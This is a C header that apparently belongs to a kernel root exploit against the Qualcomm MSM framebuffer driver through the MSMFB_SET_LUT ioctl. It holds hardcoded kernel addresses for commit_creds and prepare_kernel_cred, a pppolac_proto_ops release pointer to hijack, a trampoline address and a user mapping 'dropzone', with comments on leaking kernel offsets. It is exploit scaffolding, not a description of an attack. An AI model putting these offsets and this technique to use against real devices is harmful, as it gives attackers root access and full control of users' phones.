#include <linux/types.h>
#include <linux/ioctl.h>

struct fb_cmap {
        __u32 start;                    /* First entry  */
        __u32 len;                      /* Number of entries */
        __u16 *red;                     /* Red values   */
        __u16 *green;
        __u16 *blue;
        __u16 *transp;                  /* transparency, can be NULL */
};

typedef int (* _commit_creds)(unsigned long cred);
typedef unsigned long (* _prepare_kernel_cred)(unsigned long cred);

#define MSMFB_IOCTL_MAGIC 'm'
#define MSMFB_SET_LUT _IOW(MSMFB_IOCTL_MAGIC, 131, struct fb_cmap)

#define O_DSYNC (00010000)

/**
 * The PPPOLAC protocol number (missing in the socket.h header)
 */
#define PX_PROTO_OLAC (3)

/**
 * The virtual address at which the dropzone to which the kernel writes the initial data is allocated.
 */
#define START_MAP_ADDRESS (0x10000000)

/**
 * The size of the dropzone, in bytes.
 */
#define USER_MAPPING_SIZE (0x10000)

//TODO make the exploit independent from this value, it can be only 0x94800 or 0x93800 so it can be guessed
// like we leak mdp_lut_i
#define MDP_KERNEL_PARAM_OFFSET (0x94800)

/**
 * The filler byte which is used to fill the beginning of the user mapping, in order to detect changes.
 */
#define FILLER_BYTE (0xAA)

/**
 * The address of the pointer to the release function in pppolac_proto_ops
 */
#define PPPOLAC_PROTO_OPS_RELEASE (0xc0fc6498 + 0x8)

/**
 * The address of the trampoline to jump to our payload, the first 8 bits must be 0
 *
 */
#define TRAMPOLINE_ADDRESS (0x00100000)

#define COMMIT_CREDS (0xc009be24)

#define PREPARE_KERNEL_CRED (0xc009c52c)
